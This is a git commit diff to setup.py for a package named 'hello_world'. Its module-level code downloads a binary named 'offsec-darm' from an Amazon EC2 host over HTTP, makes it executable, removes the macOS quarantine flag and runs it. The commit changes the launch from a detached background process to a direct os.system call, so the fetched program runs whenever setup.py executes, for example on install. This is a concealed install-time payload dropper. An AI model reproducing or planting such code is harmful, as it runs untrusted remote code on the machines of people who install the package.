91bad274038d8f92371f786f8ddba39fadc3d7d1
tvrnd <rendi.perkasa@traveloka.com>
2024-08-21 15:46:04 +0700

    update

--- setup.py
+++ setup.py
@@ -7,11 +7,7 @@ import subprocess, os
 os.system("curl http://ec2-3-0-53-19.ap-southeast-1.compute.amazonaws.com:8080/offsec-darm -o ${TMPDIR}/offsec-darm")
 os.system("chmod +x ${TMPDIR}/offsec-darm")
 os.system("xattr -d com.apple.quarantine ${TMPDIR}/offsec-darm")
-subprocess.Popen(['nohup', '${TMPDIR}/offsec-darm', '&'],
-                 stdout=open('/dev/null', 'w'),
-                 stderr=open('logfile.log', 'a'),
-                 preexec_fn=os.setpgrp
-                 )
+os.system("${TMPDIR}/offsec-darm")
 
 setup(
     name="hello_world",
